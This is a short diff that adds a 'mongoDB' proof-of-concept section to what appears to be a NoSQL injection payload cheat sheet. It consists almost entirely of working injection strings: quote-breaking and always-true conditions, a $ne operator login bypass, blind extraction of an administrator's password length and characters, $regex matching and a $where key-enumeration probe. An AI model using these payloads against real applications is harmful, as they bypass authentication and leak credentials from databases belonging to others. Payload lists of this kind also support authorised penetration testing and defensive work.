@@ -712,3 +712,22 @@ user[$ne]=attacker&pass[$ne]=pas123
 ```bash
 ';return key;//
 ```
+
+<span style="font-size: 19px;">**mongoDB**</span>
+
+**PoC**
+
+```bash
+'
+'+'
+' && 0 && 'x
+' && 1 && 'x
+'||1||'
+
+administrator' && this.password.length < 30 || 'a'=='b
+administrator' && this.password[0]=='x
+
+{"$ne":""}
+{"$regex":"admin.*"}
+"$where": "Object.keys(this)[0].match('^.{0}a.*')"
+```
